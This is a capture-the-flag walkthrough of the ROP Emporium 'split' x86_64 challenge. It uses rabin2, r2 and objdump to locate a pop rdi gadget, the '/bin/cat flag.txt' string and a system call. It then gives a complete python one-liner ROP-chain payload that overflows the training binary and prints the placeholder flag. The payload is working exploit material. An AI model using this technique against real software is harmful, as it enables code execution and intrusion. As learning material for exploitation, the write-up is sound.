# ROP Emporium - 02 split x86_64

## ELF Binary Info
> $ `rabin2 -I ./split`  
```
arch     x86
baddr    0x400000
binsz    6805
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
- canary false
- nx true (i.e. DEP enabled)
- pic false (i.e. not PIE)

## Get ROP Gadgets
- "/bin/cat flag.txt" string is included in binary, so utilise this by putting its address on stack
> $ `rabin2 -z ./split | grep /bin/cat`  
```
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

- Will need to pop the above address from stack into rdi register, so look for `pop rdi` gadget
> $ `r2 -A ./split`  
> [0x004005b0]> `/R pop rdi`  
```
  0x004007c3                 5f  pop rdi
  0x004007c4                 c3  ret
```

- With rdi pointing to "/bin/cat flag.txt", return to the system() function called by usefulFunction
> $ `objdump -M intel --disassemble=usefulFunction ./split`  
```
[...]
0000000000400742 <usefulFunction>:
  400742:	55                   	push   rbp
  400743:	48 89 e5             	mov    rbp,rsp
  400746:	bf 4a 08 40 00       	mov    edi,0x40084a
  40074b:	e8 10 fe ff ff       	call   400560 <system@plt>
  400750:	90                   	nop
  400751:	5d                   	pop    rbp
  400752:	c3                   	ret    
[...]
```

## Get Flag
- payload = padding + pop_rdi_addr + bin_cat_flag + call_system_addr  
> $ `python -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\xc3\x07\x40\x00\x00\x00\x00\x00' + b'\x60\x10\x60\x00\x00\x00\x00\x00' +b'\x4b\x07\x40\x00\x00\x00\x00\x00')" | ./split`  
```
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
```

